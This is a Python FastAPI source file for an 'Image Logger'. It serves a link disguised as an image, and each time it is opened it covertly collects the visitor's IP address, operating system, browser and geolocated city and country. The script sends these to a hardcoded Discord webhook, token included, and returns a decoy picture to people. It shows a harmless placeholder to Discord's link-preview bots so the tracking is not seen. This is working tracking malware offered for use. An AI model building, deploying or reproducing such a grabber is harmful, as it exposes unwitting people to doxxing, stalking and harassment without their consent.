from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, Response
import requests
import base64
import httpagentparser
from urllib.parse import unquote

app = FastAPI()

CONFIG = {
    "webhook": "https://discordapp.com/api/webhooks/1483486883639201954/b6ucG9lCdC9ND3dKleuRMh_5AcWgGfYfm50plBGqLt4uSGrgRr_vpMNY9wpfUml9N1-R",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "username": "Image Logger",
    "color": 0x00FFFF,
}

LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def send_to_webhook(ip, user_agent, path):
    os_info, browser_info = httpagentparser.simple_detect(user_agent)
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        info = {}

    embed = {
        "username": CONFIG["username"],
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": CONFIG["color"],
            "description": f"**User Opened the Image!**\n\n**Path:** `{path}`\n**IP:** `{ip}`\n**OS:** `{os_info}`\n**Browser:** `{browser_info}`\n**Location:** `{info.get('city', 'Unknown')}, {info.get('country', 'Unknown')}`"
        }]
    }
    requests.post(CONFIG["webhook"], json=embed)

@app.get("/")
@app.get("/image.png")
async def logger(request: Request, background_tasks: BackgroundTasks, url: str = None):
    ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    user_agent = request.headers.get("user-agent", "Unknown")
    
    background_tasks.add_task(send_to_webhook, ip, user_agent, str(request.url.path))

    if "discord" in user_agent.lower() or "bot" in user_agent.lower():
        return Response(content=LOADING_IMAGE, media_type="image/jpeg")

    target_image = unquote(url) if url else CONFIG["image"]
    
    content = f"""
    <html>
        <head>
            <title>Image</title>
            <style>
                body {{ margin: 0; background: #0e0e0e; display: flex; justify-content: center; align-items: center; height: 100vh; }}
                img {{ max-width: 100%; max-height: 100%; }}
            </style>
        </head>
        <body><img src="{target_image}"></body>
    </html>
    """
    return HTMLResponse(content=content)
